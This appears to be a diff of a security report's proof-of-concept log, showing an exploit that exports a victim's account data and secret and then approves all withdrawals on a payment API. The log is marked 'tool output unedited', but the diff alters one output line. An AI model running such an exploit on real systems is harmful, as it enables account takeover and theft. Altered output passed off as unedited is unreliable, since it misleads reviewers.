@@ -34,7 +34,7 @@ Reproduction log (verified run, tool output unedited):
 $ python3 poc.py --target https://api.tollgate.example --session $VICTIM
 [*] POST /v2/account/export HTTP/1.1  Host: api.tollgate.example
 [*] HTTP/1.1 200 OK  content-type: application/json  content-length: 4183
-[+] {"user_id": 100231, "email": "victim@example.com", "role": "admin", "api_secret": "tg_live_9f2c..."}
+[+] {"user_id": 100231, "email": "victim@example.com", "role": "admin", "key": "tg_live_9f2c"}
 [+] GET /v2/admin/withdrawals?approve=all -> HTTP/1.1 302 Found
 [+] exploit succeeded: admin session obtained, withdrawal queue writable
 ```
